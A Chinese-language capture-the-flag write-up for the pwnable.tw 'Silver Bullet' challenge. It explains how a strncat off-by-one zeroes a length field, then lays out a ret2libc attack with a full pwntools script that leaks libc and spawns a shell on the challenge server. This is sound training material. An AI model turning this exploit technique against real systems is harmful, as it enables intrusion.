# [Pwnable.tw] Silver Bullet

## 程序逻辑

程序运行之后，要求输入4个选项中的一个：

```sh
+++++++++++++++++++++++++++
       Silver Bullet
+++++++++++++++++++++++++++
 1. Create a Silver Bullet
 2. Power up Silver Bullet
 3. Beat the Werewolf
 4. Return
```

这里的bullet是位于栈上的一个数据结构，如下

```c
struct bullet
{
	char s[0x30] = {0};
    size_t power=0;
}
```

s中存放一个字符串，power=strlen(s)

### create_bullet

反编译结果如下

```c
int __cdecl create_bullet(char *s)
{
  size_t v2; // [esp+0h] [ebp-4h]

  if ( *s )
    return puts("You have been created the Bullet !");
  printf("Give me your description of bullet :");
  read_input(s, 0x30u);
  v2 = strlen(s);
  printf("Your power is : %u\n", v2);
  *((_DWORD *)s + 12) = v2;
  return puts("Good luck !!");
}
```

简化后的逻辑如下:

```c
int create_bullet(struct bullet* ptr)
{
    if ((ptr->s)[0] ！= 0)
    {
        return puts("You have been created the Bullet !");
    }
    read_input(ptr->s, 0x30); 
    ptr->power = strlen(ptr->s);
    return puts("Enjoy it !");
}
```

### power_up

反编译结果如下

```c
int __cdecl power_up(char *dest)
{
  char s[48]; // [esp+0h] [ebp-34h] BYREF
  size_t v3; // [esp+30h] [ebp-4h]

  v3 = 0;
  memset(s, 0, sizeof(s));
  if ( !*dest )
    return puts("You need create the bullet first !");
  if ( *((_DWORD *)dest + 12) > 47u )
    return puts("You can't power up any more !");
  printf("Give me your another description of bullet :");
  read_input(s, 48 - *((_DWORD *)dest + 12));
  strncat(dest, s, 48 - *((_DWORD *)dest + 12));
  v3 = strlen(s) + *((_DWORD *)dest + 12);
  printf("Your new power is : %u\n", v3);
  *((_DWORD *)dest + 12) = v3;
  return puts("Enjoy it !");
}
```

简化后的逻辑如下：

```c
int power_up(struct bullet* ptr)
{
    char buf[48]={0};
    size_t new_power=0;
    	
    if ( (ptr->s)[0] == 0){
        return puts("You need create the bullet first !");
    }
 
    read_input(buf, 0x30 - (ptr->power) );
    strncat(ptr->s, buf, 0x30 - (ptr->power) );
    new_power = strlen(buf) + (ptr->power);
    ptr->power = new_power;
    return puts("Enjoy it !");
}
```

### beat

反编译后逻辑如下：

```c
int __cdecl beat(int a1, int a2)
{
  if ( *(_BYTE *)a1 )
  {
    puts(">----------- Werewolf -----------<");
    printf(" + NAME : %s\n", *(const char **)(a2 + 4));
    printf(" + HP : %d\n", *(_DWORD *)a2);
    puts(">--------------------------------<");
    puts("Try to beat it .....");
    usleep(0xF4240u);
    *(_DWORD *)a2 -= *(_DWORD *)(a1 + 48);
    if ( *(int *)a2 <= 0 )
    {
      puts("Oh ! You win !!");
      return 1;
    }
    else
    {
      puts("Sorry ... It still alive !!");
      return 0;
    }
  }
  else
  {
    puts("You need create the bullet first !");
    return 0;
  }
}
```

简化后的逻辑如下：

```c
struct monster
{
    int hp=0x7fffffff;
    char* name="gin";
}
int beat(struct bullet* bullet_ptr, struct monster* mons)
{
    if ( (bullet_ptr->s)[0] == 0 )
    {
        puts("You need create the bullet first !");
        return 0;
    }
    
    mons->hp -= bullet_ptr->power;
    if (mons->hp < 0)
    {
        puts("Oh ! You win !!");
        return 1;
    }
    puts("Sorry ... It still alive !!");
    return 0;
}
```



## 漏洞点

在power_up中，使用`strncat(ptr->s, buf, 0x30- (ptr->power) )`来连接新输入的bullet和旧的bullet，然而，strncat会在末尾补上`\x00`，如果`strlen(buf)+strlen(ptr->s) == 0x30`，那么`\x00`就会位于`ptr->s[0x31]`，也就是会覆盖了`ptr->power`的least significant byte。由于正常情况下，`ptr->power <= 48 < 0xff`，因此，其被覆盖lsB之后，四个字节均为0。

这就导致了，在`ptr->s`已经满载的情况下，仍然能够再次调用power_up，并且由于此时`power==0`，可以在`&ptr->s[0x31]`开始写0x30 Bytes，已经足够做栈溢出。



## exploitation

考虑ret2libc，于是需要：

1. 达成栈溢出，泄露libc基地址
2. 回到main函数，再次达成栈溢出，同时ret2system

### 达成栈溢出

1. create_bullet, 设置内容为`"a"*0x2f`
2. power_up，设置内容为`"a"`
3. 再次power_up时，即可进行栈溢出

### 泄露libc基地址

泄露libc地址可以考虑调用`puts`，即将main栈上的返回地址改为`puts@plt`，同时设置参数为`puts@got`，原本栈布局如下：

```
| bullet->s[0] | ... | ... | bullet->s[0x2f] | bullet->power | saved ebp | return address |
```

通过栈溢出变更为：

```
| bullet->s[0] | ... | ... | bullet->s[0x2f] | 0xffffff|1 Byte| padding  | puts@plt | main_address | puts@got
```

此处已经修改 `power = 0xffffff|1byte`，大于怪物的hp，因此能够推出main中的大循环，执行`return 0`。return之后便会调用`puts(address(puts@got))`，同时再次回到main函数。

### 再次栈溢出

这部分就是重复之前的达成栈溢出的步骤，随后覆盖返回地址为`system`，参数为`address("/bin/sh")`

脚本如下：

```python
from pwn import *

context.arch = 'i386'
context.terminal = ['tmux','splitw','-h']
# context.log_level = "debug"
def choice(io,ch):
    io.recvuntil(b"Your choice :")
    io.sendline(str(ch).encode())

def create_bullet(io, content):
    choice(io,1)
    io.recvuntil(b"Give me your description of bullet :")
    io.send(content)
    io.recvuntil(b"Your power is : ")
    power = int(io.recvline().strip(b"\n").decode(),10)
    return power

def power_up(io,content):
    choice(io,2)
    io.recvuntil(b"Give me your another description of bullet :")
    io.send(content)
    io.recvuntil(b"Your new power is : ")
    power = int(io.recvline().strip(b"\n").decode(),10)
    io.recvuntil(b"Enjoy it !\n")

def gdb_scripts(_bin):
    # scripts = f"b *{_bin.plt['puts']}\n"
    scripts = f"b *0x8048A18\n"
    scripts+= f"c\n"
    return scripts

def create_overflow(io):
    create_bullet(io,b"a"*47)
    power_up(io, b"a")

def leak_libc(io,_bin):
    create_overflow(io)
    #gdb.attach(io,gdbscript=gdb_scripts(_bin))
    #sleep(1)
    payload = p32(0xffffffff) + b"aaa"
    _rop = ROP([])
    _rop.raw(p32(_bin.plt["puts"]))
    # return to main after leaking libc
    _rop.raw(p32(_bin.symbols["main"]))
    _rop.raw(p32(_bin.got["puts"]))
    payload += _rop.chain()
    power_up(io,payload)
    choice(io,3)
    io.recvuntil(b"Oh ! You win !!\n")
    return u32(io.recvline()[:4])

def ret2system(io,libc):
    create_overflow(io)
    payload = p32(0xffffffff) + b"aaa"
    binsh = next(libc.search(b"/bin/sh\00"))
    _rop = ROP([])
    _rop.raw(libc.symbols["system"])
    _rop.raw(binsh)
    _rop.raw(binsh)
    payload += _rop.chain()
    power_up(io,payload)
    choice(io,3)
    
DEBUG = False

if __name__ == '__main__':
    if DEBUG:
        io = process("./silver_bullet")
    else:
        io = remote("chall.pwnable.tw",10103)
    
    _bin = ELF("./silver_bullet")
    libc = ELF("./libc_32.so.6")
    _rop = ROP(_bin)
    libc.address = leak_libc(io,_bin) - libc.symbols["puts"]
    print(f"libc leaked at : {hex(libc.address)}")
    # ret2libc
    ret2system(io,libc)
    io.interactive()
```

